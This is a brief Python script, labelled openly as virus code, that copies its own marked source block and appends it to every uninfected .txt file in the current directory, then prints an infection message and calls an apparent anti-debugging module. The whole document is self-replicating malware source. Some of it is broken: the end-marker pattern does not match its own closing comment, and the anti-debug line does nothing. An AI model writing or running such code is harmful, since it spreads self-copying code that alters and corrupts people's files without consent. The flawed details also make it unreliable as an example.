# starting virus code
import sys
import re
import glob
import anti_debug

virusCode = []

thisFile = sys.argv[0]
virusFile = open(thisFile, "r")
lines = virusFile.readlines()
virusFile.close()


inVirus = False
for line in lines:
    if(re.search("^# starting virus code", line)):
        inVirus = True

    if(inVirus == True):
        virusCode.append(line)
    if(re.search("^#end of virus code", line)):
        break

virus_program = glob.glob("*.txt")


for p in virus_program:
    file = open(p, "r")
    programCode = file.readlines()
    file.close()


    infected = False 
    for line in programCode:
        if(re.search("^# starting virus code", line)):
            infected = True
            break
    if not infected:
        newCode = []
        newCode = programCode
        newCode.extend(virusCode)

        file = open(p, "w")
        file.writelines(newCode)
        file.close()
print("This file is infected!")
anti_debug.debug

# end of virus code
